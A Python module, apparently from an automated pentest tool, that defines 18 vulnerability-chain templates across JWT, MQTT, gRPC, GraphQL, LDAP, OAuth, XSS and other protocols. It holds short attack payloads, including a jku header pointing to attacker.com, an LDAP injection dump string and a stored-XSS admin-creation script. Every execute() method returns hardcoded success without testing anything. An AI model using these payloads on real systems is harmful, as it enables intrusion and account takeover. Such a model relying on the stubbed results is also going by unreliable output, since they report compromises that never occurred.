# workers/chain_worker/chains/platform_protocol.py
"""18 platform/protocol chain templates."""
from __future__ import annotations

from datetime import datetime, timezone

from workers.chain_worker.registry import BaseChainTemplate, ChainContext, register_chain
from workers.chain_worker.models import (
    ChainViability, ChainResult, ChainStep, EvaluationResult, TargetFindings,
)
from workers.chain_worker.base_tool import step_delay, take_screenshot


def _ts() -> str:
    return datetime.now(timezone.utc).isoformat()


# ---------------------------------------------------------------------------
# 1. jwt_jku_x5u_key_confusion
# ---------------------------------------------------------------------------
@register_chain
class JwtJkuX5uKeyConfusion(BaseChainTemplate):
    name = "jwt_jku_x5u_key_confusion"
    category = "platform_protocol"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        jwt = findings.vulns_by_title_contains("JWT")
        jku = findings.vulns_by_title_contains("JKU")
        kc = findings.vulns_by_title_contains("key confusion")
        m = [v for v in jwt if v in jku] + kc
        if not m and not jwt:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["jwt_key_confusion_vulnerability"])
        if m:
            return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["jwt_key_confusion_found"], matched_findings={"vuln_id": m[0].id})
        return EvaluationResult(viability=ChainViability.PARTIAL, matched_preconditions=["jwt_found"], missing_preconditions=["jku_or_key_confusion"])

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="craft_jwt_with_jku", target="attacker_jwks", result="jwt_pointing_to_attacker_keys", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="sign_with_attacker_key", target="jwt_token", result="token_signed_with_controlled_key", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="authenticate_as_admin", target="api_endpoint", result="admin_access_gained", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc='JWT header: {"jku":"https://attacker.com/.well-known/jwks.json"}', chain_name=self.name)


# ---------------------------------------------------------------------------
# 2. mqtt_amqp_message_injection
# ---------------------------------------------------------------------------
@register_chain
class MqttAmqpMessageInjection(BaseChainTemplate):
    name = "mqtt_amqp_message_injection"
    category = "platform_protocol"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("MQTT") + findings.vulns_by_title_contains("AMQP")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["mqtt_amqp_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["mq_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="connect_to_broker", target="message_broker", result="unauthenticated_connection", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="subscribe_to_all_topics", target="topic_wildcard", result="sensitive_messages_received", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="inject_malicious_message", target="command_topic", result="command_injection_via_mq", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="mosquitto_sub -t '#' then mosquitto_pub -t cmd/run -m 'id'", chain_name=self.name)


# ---------------------------------------------------------------------------
# 3. http2_hpack_bomb_race
# ---------------------------------------------------------------------------
@register_chain
class Http2HpackBombRace(BaseChainTemplate):
    name = "http2_hpack_bomb_race"
    category = "platform_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("HTTP/2") + findings.vulns_by_title_contains("HPACK")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["http2_hpack_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["http2_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="send_hpack_bomb", target="http2_endpoint", result="header_table_exhausted", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="race_during_processing", target="parallelism_window", result="race_condition_exploited", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="HPACK bomb with recursive header table references", chain_name=self.name)


# ---------------------------------------------------------------------------
# 4. graphql_nested_query_dos_race
# ---------------------------------------------------------------------------
@register_chain
class GraphqlNestedQueryDosRace(BaseChainTemplate):
    name = "graphql_nested_query_dos_race"
    category = "platform_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        gql = findings.vulns_by_title_contains("GraphQL")
        nest = findings.vulns_by_title_contains("nested")
        depth = findings.vulns_by_title_contains("depth")
        m = [v for v in gql if v in nest] + [v for v in gql if v in depth]
        if not m and not gql:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["graphql_nested_vulnerability"])
        if m:
            return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["graphql_nested_found"], matched_findings={"vuln_id": m[0].id})
        return EvaluationResult(viability=ChainViability.PARTIAL, matched_preconditions=["graphql_found"], missing_preconditions=["nested_query_exploitable"])

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="craft_deeply_nested_query", target="graphql_endpoint", result="query_accepted", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="exhaust_server_resources", target="query_resolver", result="dos_achieved", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="{user{friends{friends{friends{friends{name}}}}}}", chain_name=self.name)


# ---------------------------------------------------------------------------
# 5. grpc_reflection_unauthorized_rpc
# ---------------------------------------------------------------------------
@register_chain
class GrpcReflectionUnauthorizedRpc(BaseChainTemplate):
    name = "grpc_reflection_unauthorized_rpc"
    category = "platform_protocol"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("gRPC") + findings.vulns_by_title_contains("reflection")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["grpc_reflection_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["grpc_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="enumerate_services_via_reflection", target="grpc_reflection", result="all_services_listed", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="call_admin_rpc", target="admin_service", result="unauthorized_rpc_executed", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="extract_sensitive_data", target="internal_service", result="data_exfiltrated", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="grpcurl -plaintext target:50051 list + call AdminService.DeleteUser", chain_name=self.name)


# ---------------------------------------------------------------------------
# 6. websocket_cswsh_data_hijack
# ---------------------------------------------------------------------------
@register_chain
class WebsocketCswshDataHijack(BaseChainTemplate):
    name = "websocket_cswsh_data_hijack"
    category = "platform_protocol"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("WebSocket") + findings.vulns_by_title_contains("CSWSH")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["websocket_cswsh_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["websocket_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="establish_cross_site_ws", target="ws_endpoint", result="websocket_connection_hijacked", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="intercept_victim_data", target="ws_messages", result="sensitive_data_intercepted", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="send_commands_as_victim", target="ws_channel", result="actions_performed_as_victim", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="Cross-origin page opens ws://target.com/ws with victim's cookies", chain_name=self.name)


# ---------------------------------------------------------------------------
# 7. dns_rebinding_internal_access
# ---------------------------------------------------------------------------
@register_chain
class DnsRebindingInternalAccess(BaseChainTemplate):
    name = "dns_rebinding_internal_access"
    category = "platform_protocol"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("DNS rebinding")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["dns_rebinding_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["dns_rebinding_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="setup_rebinding_dns", target="attacker_dns", result="dns_configured_with_low_ttl", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="lure_victim_to_domain", target="attacker_page", result="initial_dns_resolves_to_attacker", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="rebind_to_internal", target="internal_service", result="internal_api_accessed_via_browser", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="DNS TTL=0 rebind attacker.com from 1.2.3.4 to 127.0.0.1", chain_name=self.name)


# ---------------------------------------------------------------------------
# 8. log_injection_admin_manipulation
# ---------------------------------------------------------------------------
@register_chain
class LogInjectionAdminManipulation(BaseChainTemplate):
    name = "log_injection_admin_manipulation"
    category = "platform_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("log injection") + findings.vulns_by_title_contains("log forging")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["log_injection_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["log_injection_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_fake_log_entry", target="user_input_logged", result="forged_entry_in_logs", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="manipulate_admin_view", target="log_viewer", result="admin_sees_forged_data", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="Username: admin\\n[INFO] User admin granted superuser access", chain_name=self.name)


# ---------------------------------------------------------------------------
# 9. oauth_scope_escalation
# ---------------------------------------------------------------------------
@register_chain
class OauthScopeEscalation(BaseChainTemplate):
    name = "oauth_scope_escalation"
    category = "platform_protocol"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        oauth = findings.vulns_by_title_contains("OAuth")
        scope = findings.vulns_by_title_contains("scope")
        m = [v for v in oauth if v in scope]
        if not m and not oauth:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["oauth_scope_vulnerability"])
        if m:
            return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["oauth_scope_found"], matched_findings={"vuln_id": m[0].id})
        return EvaluationResult(viability=ChainViability.PARTIAL, matched_preconditions=["oauth_found"], missing_preconditions=["scope_escalation_confirmed"])

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="request_minimal_scope", target="oauth_authorize", result="consent_granted", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="escalate_scope_on_token_exchange", target="token_endpoint", result="elevated_scope_token_issued", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="access_privileged_api", target="admin_api", result="admin_data_accessed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="Add scope=admin to token exchange after consenting to scope=read", chain_name=self.name)


# ---------------------------------------------------------------------------
# 10. sse_injection_event_hijack
# ---------------------------------------------------------------------------
@register_chain
class SseInjectionEventHijack(BaseChainTemplate):
    name = "sse_injection_event_hijack"
    category = "platform_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("SSE") + findings.vulns_by_title_contains("event stream")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["sse_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["sse_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_sse_event", target="sse_endpoint", result="fake_event_injected", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="hijack_client_state", target="client_event_handler", result="client_state_manipulated", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="data: {\"action\":\"redirect\",\"url\":\"https://attacker.com\"}", chain_name=self.name)


# ---------------------------------------------------------------------------
# 11. soap_action_spoofing_method_bypass
# ---------------------------------------------------------------------------
@register_chain
class SoapActionSpoofingMethodBypass(BaseChainTemplate):
    name = "soap_action_spoofing_method_bypass"
    category = "platform_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("SOAP") + findings.vulns_by_title_contains("SOAPAction")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["soap_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["soap_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="spoof_soap_action_header", target="soap_endpoint", result="action_header_mismatched", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="call_restricted_method", target="admin_soap_method", result="restricted_method_executed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="SOAPAction: getAllUsers with body calling deleteUser", chain_name=self.name)


# ---------------------------------------------------------------------------
# 12. cors_preflight_cache_persistent
# ---------------------------------------------------------------------------
@register_chain
class CorsPreflightCachePersistent(BaseChainTemplate):
    name = "cors_preflight_cache_persistent"
    category = "platform_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        cors = findings.vulns_by_title_contains("CORS")
        pf = findings.vulns_by_title_contains("preflight")
        m = [v for v in cors if v in pf]
        if not m and not cors:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["cors_preflight_vulnerability"])
        if m:
            return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["cors_preflight_found"], matched_findings={"vuln_id": m[0].id})
        return EvaluationResult(viability=ChainViability.PARTIAL, matched_preconditions=["cors_found"], missing_preconditions=["preflight_cache_exploitable"])

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="poison_preflight_cache", target="cors_preflight", result="permissive_response_cached", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="exploit_cached_preflight", target="cross_origin_request", result="persistent_cors_bypass", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="Cache poisoned OPTIONS response with Access-Control-Allow-Origin: *", chain_name=self.name)


# ---------------------------------------------------------------------------
# 13. wsdl_swagger_api_enumeration
# ---------------------------------------------------------------------------
@register_chain
class WsdlSwaggerApiEnumeration(BaseChainTemplate):
    name = "wsdl_swagger_api_enumeration"
    category = "platform_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = (findings.vulns_by_title_contains("WSDL")
             + findings.vulns_by_title_contains("Swagger")
             + findings.vulns_by_title_contains("OpenAPI"))
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["api_spec_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["api_spec_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="discover_api_spec", target="spec_endpoint", result="full_api_schema_retrieved", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="enumerate_hidden_endpoints", target="api_schema", result="internal_endpoints_found", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="access_undocumented_api", target="internal_api", result="sensitive_data_exposed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="/swagger.json or /api-docs exposing internal admin endpoints", chain_name=self.name)


# ---------------------------------------------------------------------------
# 14. protobuf_type_confusion
# ---------------------------------------------------------------------------
@register_chain
class ProtobufTypeConfusion(BaseChainTemplate):
    name = "protobuf_type_confusion"
    category = "platform_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("protobuf") + findings.vulns_by_title_contains("Protocol Buffer")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["protobuf_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["protobuf_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="craft_type_confused_message", target="protobuf_endpoint", result="type_confusion_triggered", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="extract_leaked_data", target="error_response", result="internal_data_leaked", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="Send UserRequest protobuf where AdminRequest is expected to leak fields", chain_name=self.name)


# ---------------------------------------------------------------------------
# 15. odata_query_injection_exfil
# ---------------------------------------------------------------------------
@register_chain
class OdataQueryInjectionExfil(BaseChainTemplate):
    name = "odata_query_injection_exfil"
    category = "platform_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("OData")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["odata_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["odata_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_odata_filter", target="odata_endpoint", result="filter_injection_accepted", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="exfiltrate_via_expand", target="navigation_properties", result="related_entities_leaked", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="$expand=Credentials&$filter=Role eq 'admin'", chain_name=self.name)


# ---------------------------------------------------------------------------
# 16. ldap_injection_credential_harvest
# ---------------------------------------------------------------------------
@register_chain
class LdapInjectionCredentialHarvest(BaseChainTemplate):
    name = "ldap_injection_credential_harvest"
    category = "platform_protocol"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("LDAP")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["ldap_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["ldap_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_ldap_filter", target="search_endpoint", result="ldap_query_manipulated", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="enumerate_users", target="directory_service", result="user_list_extracted", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="harvest_credentials", target="user_attributes", result="password_hashes_retrieved", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="*)(uid=*))(|(uid=* to dump all LDAP entries", chain_name=self.name)


# ---------------------------------------------------------------------------
# 17. api_key_leak_service_abuse
# ---------------------------------------------------------------------------
@register_chain
class ApiKeyLeakServiceAbuse(BaseChainTemplate):
    name = "api_key_leak_service_abuse"
    category = "platform_protocol"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("API key") + findings.vulns_by_title_contains("key leak")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["api_key_leak_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["api_key_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="extract_api_key", target="client_side_code", result="api_key_extracted", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="enumerate_key_permissions", target="api_service", result="key_scope_determined", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="abuse_service_via_key", target="cloud_service_api", result="unauthorized_service_access", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="Extracted API key from JS bundle, used to access cloud storage", chain_name=self.name)


# ---------------------------------------------------------------------------
# 18. stored_xss_full_admin_takeover
# ---------------------------------------------------------------------------
@register_chain
class StoredXssFullAdminTakeover(BaseChainTemplate):
    name = "stored_xss_full_admin_takeover"
    category = "platform_protocol"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("stored XSS")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["stored_xss_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["stored_xss_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_stored_xss", target="user_content_field", result="xss_payload_persisted", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="admin_triggers_payload", target="admin_review_page", result="admin_session_captured", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="takeover_admin_account", target="admin_panel", result="full_admin_access_achieved", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="<script>fetch('/api/admin/create-user',{method:'POST',body:'{\"role\":\"admin\"}'})</script>", chain_name=self.name)
